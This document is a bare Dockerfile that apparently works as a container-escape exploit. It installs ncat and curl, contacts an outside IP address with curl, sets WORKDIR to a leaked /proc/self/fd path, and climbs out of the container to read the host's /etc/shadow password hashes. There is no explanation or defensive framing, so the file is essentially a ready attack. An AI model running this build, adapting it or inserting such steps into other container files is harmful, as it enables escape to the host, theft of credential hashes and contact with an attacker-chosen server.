FROM ubuntu
RUN apt update && apt install -y curl && apt install -y ncat && apt install python3 -y
RUN curl http://68.183.4.199/from_ibm
CMD ["/bin/bash"]
WORKDIR /proc/self/fd/7/
RUN cd ../../../../../ && cat /etc/shadow
